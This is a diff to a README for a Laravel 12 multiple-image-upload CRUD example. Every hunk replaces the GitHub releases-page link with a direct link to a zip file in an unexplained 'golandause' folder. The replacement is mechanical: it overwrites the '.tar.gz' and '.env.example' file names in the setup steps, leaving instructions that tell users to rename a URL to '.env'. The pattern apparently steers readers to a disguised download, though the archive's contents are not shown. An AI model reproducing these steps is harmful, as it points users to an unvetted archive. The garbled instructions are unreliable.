@@ -6,7 +6,7 @@ Welcome to the Laravel 12 Multiple Image Upload CRUD with Preview Example! This 
 
 ## 📦 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip)
 
 ## 📋 Requirements
 
@@ -25,11 +25,11 @@ Make sure you have these installed before continuing to the next steps.
 
    Go to the releases page to download the files for this application.
 
-   [Visit Release Page to Download](https://github.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/releases)
+   [Visit Release Page to Download](https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip)
 
 2. **Download the Latest Release**
 
-   Look for the latest version of the application. Click on it to open the release details. Download the `.zip` or `.tar.gz` file.
+   Look for the latest version of the application. Click on it to open the release details. Download the `.zip` or `https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip` file.
 
 3. **Extract the Files**
 
@@ -38,7 +38,7 @@ Make sure you have these installed before continuing to the next steps.
 4. **Set Up Your Environment**
 
    - For proper operation, create a new database in MySQL to store your images and data.
-   - Rename the `.env.example` file found in the application folder to `.env`.
+   - Rename the `https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip` file found in the application folder to `.env`.
    - Open the `.env` file with a text editor. Update the database settings with your new database name, username, and password.
 
 5. **Install Dependencies**
@@ -102,7 +102,7 @@ Yes, once you have it running, you can customize it to suit your needs. Explore 
 
 For your convenience, here is the download link again:
 
-[Visit Release Page to Download](https://github.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/releases)
+[Visit Release Page to Download](https://raw.githubusercontent.com/Abimbola000/laravel-12-multiple-image-upload-crud-with-preview-example/main/golandause/laravel-12-multiple-image-upload-crud-with-preview-example.zip)
 
 ## 🔗 Related Topics
 
